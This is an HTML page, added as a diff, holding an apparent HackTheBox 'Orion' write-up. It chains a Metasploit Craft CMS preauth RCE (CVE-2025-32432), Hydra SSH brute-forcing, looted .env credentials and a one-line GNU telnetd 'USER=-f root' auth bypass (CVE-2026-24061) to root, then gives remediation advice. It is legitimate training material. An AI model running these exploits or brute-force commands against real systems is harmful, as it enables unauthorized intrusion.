@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Orion - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox Orion (Easy, Linux): an outdated Craft CMS 5.6.16 falls to the preauth image-transform RCE (CVE-2025-32432) for a www-data shell; a leaked .env and project.yaml give the DB password and adam's email, adam's weak SSH password is cracked with Hydra, and a locally bound GNU Inetutils telnetd (CVE-2026-24061) is abused with USER=-f root for a root shell.">
+<link rel="canonical" href="https://sudoanthony.github.io/writeup-orion.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="~/sudoanthony">
+<meta property="og:title" content="Orion - HackTheBox (Easy, Linux)">
+<meta property="og:description" content="Craft CMS 5.6.16 preauth RCE (CVE-2025-32432) for a foothold, a cracked SSH password for adam, then a loopback-only GNU Inetutils telnetd auth bypass (CVE-2026-24061) for root.">
+<meta property="og:url" content="https://sudoanthony.github.io/writeup-orion.html">
+<meta property="og:image" content="https://sudoanthony.github.io/images/orion-og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Orion - HackTheBox (Easy, Linux)">
+<meta name="twitter:description" content="Craft CMS 5.6.16 preauth RCE, a Hydra-cracked SSH password, and a loopback telnetd auth bypass (CVE-2026-24061) to root.">
+<meta name="twitter:image" content="https://sudoanthony.github.io/images/orion-og.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <div class="wu-head">
+    <img class="wu-icon" src="images/icons/Orion.png" alt="" onerror="this.style.display='none'">
+    <h1>Orion</h1>
+  </div>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Linux &middot; web &middot; CMS</span>
+    <span class="sep">|</span>
+    <span>25 Oct 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>Orion is a web box front to back. The site runs an outdated <strong>Craft CMS 5.6.16</strong>, which
+    falls to the preauth image-transform RCE (<strong>CVE-2025-32432</strong>) for a shell as
+    <code>www-data</code>. Looting the web root, a <code>.env</code> and <code>project.yaml</code> hand us the
+    database password and, more usefully, the admin's email <code>adam@orion.htb</code>. That username is the
+    whole point: we crack adam's <strong>SSH password</strong> with Hydra and log in. As adam, an internal
+    look at listening ports finds a <strong>telnet</strong> service bound to loopback, running a vulnerable
+    <strong>GNU Inetutils telnetd</strong> (<strong>CVE-2026-24061</strong>). Setting <code>USER=-f root</code>
+    bypasses authentication and drops us straight to a <strong>root</strong> shell.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#craft-cms-rce">craft-cms-rce</a>
+    <a class="tag" href="vulns.html#sensitive-data-exposure">sensitive-data-exposure</a>
+    <a class="tag" href="vulns.html#weak-ssh-password">weak-ssh-password</a>
+    <a class="tag" href="vulns.html#telnet-auth-bypass">telnet-auth-bypass</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">how we ran this one: adventure mode</span>
+    We ran Orion timed and blind - no hints, no walkthroughs read until after, working the box the way it
+    actually unfolded. That means this writeup keeps the real order, dead ends and rabbit holes included,
+    rather than a clean hindsight route.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Enumeration</h2>
+
+  <p>Full port and service scan first:</p>
+  <pre><code><span class="p">$</span> nmap -sCV -p- -T4 --min-rate 5000 <span class="o">10.129.244.146</span></code></pre>
+  <figure><img src="images/Orion/orion01.png" alt="nmap showing SSH on 22 and HTTP on 80 redirecting to orion.htb"><figcaption>Only two ports: <strong>22 (SSH)</strong> and <strong>80 (HTTP)</strong>, nginx redirecting to <code>http://orion.htb/</code>. SSH gives nothing without credentials, so we park it and add <code>orion.htb</code> to <code>/etc/hosts</code>.</figcaption></figure>
+
+  <p>The site is a telecom marketing page. Wappalyzer and the footer tell the real story: it's a
+  <strong>Craft CMS</strong> site on the <strong>Yii</strong> framework, PHP, nginx, Ubuntu:</p>
+  <figure><img src="images/Orion/orion02.png" alt="Orion Telecom landing page"><figcaption>"Orion Telecom" - a single-page site, powered by CraftCMS per the footer.</figcaption></figure>
+
+  <p>The page is JavaScript-rendered so we can't right-click the source, but <code>curl</code> reads it fine and
+  confirms the stack straight from the response header:</p>
+  <pre><code><span class="p">$</span> curl -i http://orion.htb</code></pre>
+  <figure><img src="images/Orion/orion03.png" alt="curl -i showing X-Powered-By Craft CMS header and page source"><figcaption><code>X-Powered-By: Craft CMS</code> confirmed in the header, with <code>assets/js/main.js</code> and the rest of the source below it.</figcaption></figure>
+
+  <p>Asking for <code>robots.txt</code> returns a verbose Yii error page instead of a file. That tells us two
+  things at once: the app is in <strong>dev mode</strong> (leaking full stack traces), and it hands us real
+  server paths and the framework version:</p>
+  <figure><img src="images/Orion/orion04.png" alt="robots.txt returning a Yii NotFoundHttpException debug page leaking /var/www/html/craft paths"><figcaption>A <code>yii\web\NotFoundHttpException</code> debug page leaking <code>/var/www/html/craft/web/index.php</code> and, at the bottom, <strong>Yii Framework/2.0.51</strong>. Noted for the vulnerability assessment later.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Finding the admin panel</h2>
+
+  <p>There isn't much on the public site, and everything points at Craft CMS being the way in, so we brute-force
+  for directories:</p>
+  <pre><code><span class="p">$</span> feroxbuster -u http://orion.htb -w .../common.txt -x php,html,txt -t 50 -C 404,403 -o ferox_quick.txt</code></pre>
+  <figure><img src="images/Orion/orion05.png" alt="feroxbuster finding /admin redirecting to /admin/login"><figcaption><code>/admin</code> redirects to <code>/admin/login</code> - the Craft control panel. (<code>/assets</code> returns 403, which just confirms it exists.)</figcaption></figure>
+
+  <p>The login page is the Orion Telecom admin portal, and it helpfully prints the exact CMS version:</p>
+  <figure><img src="images/Orion/orion06.png" alt="Craft CMS admin login panel showing version 5.6.16"><figcaption>Craft CMS <strong>5.6.16</strong>. Craft ships with no default credentials, so our quick guesses (<code>admin</code>/<code>admin</code>, a few obvious pairs) go nowhere. Time to check the version itself.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Vulnerability assessment</h2>
+
+  <p>With a concrete version in hand, we check for known exploits:</p>
+  <pre><code><span class="p">$</span> searchsploit craft cms</code></pre>
+  <figure><img src="images/Orion/orion07.png" alt="searchsploit listing Craft CMS 5.6.16 - RCE"><figcaption>A direct hit: <strong>Craft CMS 5.6.16 - RCE</strong>.</figcaption></figure>
+
+  <p>Reading it up, this is <strong>CVE-2025-32432</strong>, a preauth remote code execution flaw in Craft's
+  image-transform handling (inherited from a Yii bug). Per NVD it's
+  <a href="https://nvd.nist.gov/vuln/detail/cve-2025-32432" target="_blank">patched in 3.9.15, 4.14.15, and
+  5.6.17</a>. Our target is <strong>5.6.16</strong>, one release short of the fix, so it should work.</p>
+
+  <div class="note insight">
+    <span class="lbl">why this is the finding</span>
+    "Preauth" is the key word. A content-management panel we can't log into is normally a wall, but a
+    pre-authentication RCE means we don't need a credential at all. The CMS being a single patch version behind
+    is the whole vulnerability - no misconfiguration required, just an unpatched release exposed to the
+    internet.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Foothold - Craft CMS preauth RCE</h2>
+
+  <p>There's a public PoC, but the flaw also has a Metasploit module that matches our CVE exactly, so we use it:</p>
+  <figure><img src="images/Orion/orion08.png" alt="msfconsole search craft cms showing the craftcms_preauth_rce_cve_2025_32432 module"><figcaption><code>exploit/linux/http/craftcms_preauth_rce_cve_2025_32432</code>, rank excellent. We take the Unix command-shell target.</figcaption></figure>
+
+  <p>Set the target host and our listener, then run it:</p>
+  <pre><code><span class="p">msf</span> > set RHOSTS orion.htb
+<span class="p">msf</span> > set LHOST <span class="o">10.10.15.114</span>
+<span class="p">msf</span> > run</code></pre>
+  <figure><img src="images/Orion/orion09.png" alt="Metasploit confirming the target is vulnerable, leaking the session path and opening a Meterpreter session"><figcaption>The module confirms the target is vulnerable (session path leaked), injects its payload, and opens a Meterpreter session. Dropping to a shell lands us as <code>www-data@orion</code>.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Enumeration as www-data</h2>
+
+  <p>Standard first checks. We have no sudo rights, and a user <code>adam</code> exists whose home we can't
+  read, so adam is the next rung:</p>
+  <figure><img src="images/Orion/orion10.png" alt="www-data running whoami, id, sudo -l, os-release and uname"><figcaption><code>www-data</code> with no sudo (password required), on Ubuntu 22.04.5. <code>/etc/passwd</code> shows only <code>root</code> and <code>adam</code> with real shells.</figcaption></figure>
+
+  <p>Since our shell starts in <code>/var/www</code>, that's where we hunt for credentials. Craft keeps its
+  secrets in a <code>.env</code>:</p>
+  <figure><img src="images/Orion/orion11.png" alt=".env file exposing the Craft database password and security key"><figcaption>Database credentials (<code>root</code> / <code>SuperSecureCraft123Pass!</code>), the Craft security key, and confirmation that <strong>dev mode</strong> and <strong>allowAdminChanges</strong> are both on.</figcaption></figure>
+
+  <p>Those database credentials turn out to be a dead end for now. MySQL isn't exposed externally (a quick
+  <code>nmap -p 3306</code> shows it closed), and <code>root</code> / <code>SuperSecureCraft123Pass!</code>
+  fails against the admin login, SSH, and <code>su</code>. The more useful find is in Craft's
+  <code>project.yaml</code>:</p>
+  <figure><img src="images/Orion/orion12.png" alt="project.yaml revealing the admin email adam@orion.htb"><figcaption>The system email is <code>adam@orion.htb</code>. Until now we only had the <em>name</em> adam; this confirms the account and its format.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">the finding is the username, not the password</span>
+    The database password looks like the prize, but it's the <strong>username</strong> that moves us forward.
+    adam was hidden behind permission denials; surfacing <code>adam@orion.htb</code> gives us a confirmed login
+    name to target. On a box with SSH open and no account lockout, a known username plus a weak password is a
+    crackable combination.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 06 ==================== -->
+  <h2><span class="num">06</span>Foothold to adam - cracking SSH</h2>
+
+  <p>With a valid username, we point Hydra at SSH and let it run against rockyou while we keep enumerating:</p>
+  <pre><code><span class="p">$</span> hydra -l adam -P /usr/share/wordlists/rockyou.txt <span class="o">10.129.244.146</span> ssh</code></pre>
+
+  <p>It lands on a valid password for adam: <code>darkangel</code>. That logs straight in over SSH:</p>
+  <pre><code><span class="p">$</span> ssh adam@orion.htb        <span class="c"># password: darkangel</span></code></pre>
+
+  <p>So the whole first half was really about finding a username to crack. We re-run our basic privilege checks
+  as adam. The admin panel now opens with these same credentials, but its update warnings and known CMS issues
+  lead nowhere useful for privesc. A couple of things from enumeration stand out instead:
+  a <code>.wget-hsts</code> file shows adam previously fetched something from <code>ftp.gnu.org</code>, and the
+  <code>.env</code> had reminded us MySQL is running locally.</p>
+
+  <hr>
+
+  <!-- ==================== 07 ==================== -->
+  <h2><span class="num">07</span>Enumeration as adam</h2>
+
+  <p>The services that never showed up in our external scan are the ones to check from the inside. Listing
+  listening sockets:</p>
+  <pre><code><span class="p">$</span> ss -lntp</code></pre>
+  <pre><code>LISTEN  127.0.0.1:23     <span class="c"># telnet, localhost only</span>
+LISTEN  127.0.0.1:3306   <span class="c"># MySQL, localhost only</span></code></pre>
+
+  <p>MySQL (<code>127.0.0.1:3306</code>) does accept the leaked database password, and as root it even has
+  <code>FILE</code> and full grants, but <code>secure_file_priv</code> and the lack of a useful write target
+  make it a dead end. Telnet on <strong>127.0.0.1:23</strong> is the odd one - an ancient service to find
+  running in 2026.</p>
+
+  <p>Comparing adam's binaries against a clean system turns up legacy r-services that shouldn't be there, and
+  <code>rsh --version</code> explains both the binaries and that <code>ftp.gnu.org</code> breadcrumb:</p>
+  <pre><code><span class="p">$</span> rsh --version
+GNU inetutils 2.7</code></pre>
+
+  <div class="note insight">
+    <span class="lbl">connecting the breadcrumbs</span>
+    adam's <code>.wget-hsts</code> showed a fetch from <code>ftp.gnu.org</code>; the SUID <code>rsh</code> /
+    <code>rlogin</code> / <code>rcp</code> binaries and the loopback telnet service are what he built from it -
+    <strong>GNU Inetutils 2.7</strong>. A version string on a service that shouldn't exist is exactly the kind
+    of lead to run down before reaching for anything exotic.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 08 ==================== -->
+  <h2><span class="num">08</span>Privilege escalation - telnetd auth bypass</h2>
+
+  <p>GNU Inetutils 1.9.3 through 2.7 has a critical remote authentication bypass in <code>telnetd</code>,
+  <strong>CVE-2026-24061</strong>. The daemon passes the client-supplied <code>USER</code> environment variable
+  (sent via the Telnet <code>NEW-ENVIRON</code> option) straight into the <code>login</code> command line
+  without sanitizing it. Set <code>USER=-f root</code> and the daemon runs <code>login -f root</code>, and
+  <code>-f</code> tells <code>login</code> to treat the session as already authenticated.</p>
+
+  <p>The telnet service is only bound to loopback, but we're already on the box as adam, so we trigger it
+  locally. The telnet client's <code>-a</code> flag sends our environment during negotiation:</p>
+  <pre><code><span class="p">$</span> env USER='-f root' telnet -a 127.0.0.1 23</code></pre>
+
+  <p>The daemon runs <code>login -f root</code>, skips authentication entirely, and hands us a
+  <strong>root</strong> shell. The root flag is in <code>/root</code> <span style="color:var(--text-4)">[flag
+  omitted]</span>. Box owned.</p>
+
+  <div class="note insight">
+    <span class="lbl">loopback is not a safety net</span>
+    It's tempting to ignore a service bound to <code>127.0.0.1</code> because an external scan never sees it.
+    But once you have <em>any</em> local foothold, a loopback service is just as reachable as a public one -
+    and a pre-auth bypass on it is a direct line to root. Internal enumeration (<code>ss -lntp</code>) is what
+    surfaces these.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 09 ==================== -->
+  <h2><span class="num">09</span>Root cause &amp; remediation</h2>
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Outdated Craft CMS (preauth RCE)</strong><br><span style="color:var(--text-4);font-size:13px">5.6.16 / CVE-2025-32432</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Patch to 5.6.17+ (or the fixed 3.x/4.x release). Keep the CMS and its framework current, and put the control panel behind network ACLs so a single public preauth bug isn't instant code execution.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Dev mode and secrets in the web root</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Verbose errors leaked server paths and the framework version. Disable <code>CRAFT_DEV_MODE</code> and set <code>allowAdminChanges</code> to <code>false</code> in production, and keep <code>.env</code> / <code>project.yaml</code> out of any web-readable location.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Weak, crackable SSH password</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">adam's password fell to rockyou once the username was known. Enforce strong passwords, use key-based SSH auth, and add rate limiting / lockout (fail2ban) so online brute-forcing isn't viable.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Vulnerable telnetd running as root</strong><br><span style="color:var(--text-4);font-size:13px">GNU Inetutils 2.7 / CVE-2026-24061</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Don't run telnet at all - it's obsolete and this version has a pre-auth root bypass. Remove the service, upgrade Inetutils to 2.8+ if it's truly needed, and strip the SUID r-service binaries. Loopback binding is not a mitigation once a local foothold exists.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p>For context, the <code>.env</code> flags Craft's own guidance on locking production down:</p>
+  <figure><img src="images/Orion/orion13.png" alt="Craft documentation explaining allowAdminChanges should be false in production"><figcaption>Craft's docs: setting <code>allowAdminChanges</code> to <code>false</code> in production locks schema and settings changes and limits the damage if an admin account is compromised - the opposite of how Orion was configured.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 10 ==================== -->
+  <h2><span class="num">10</span>Takeaways</h2>
+  <p>This box is a good reminder to really start simple and not get caught up in potential rabbit holes. The
+  admin dashboard caught my interest, and so did the myriad of services and versions presented to me. It was
+  easy to get lost in researching vulnerabilities and having endless possibilities flow through my mind. Orion,
+  while easy, is a good reminder to just focus on the basics when it comes to privilege escalation: orient
+  yourself, your surroundings, and your privileges, and only once those are exhausted move on to the more far
+  out there ideas.</p>
+  <p>The chain itself is clean once you trust it: a public version number points at a preauth CMS RCE, looted
+  config files hand over a username, that username makes an SSH password crackable, and internal enumeration
+  turns up a loopback service with a pre-auth root bypass. Every step was found by enumerating what was in
+  front of me rather than forcing anything. Fun box.</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
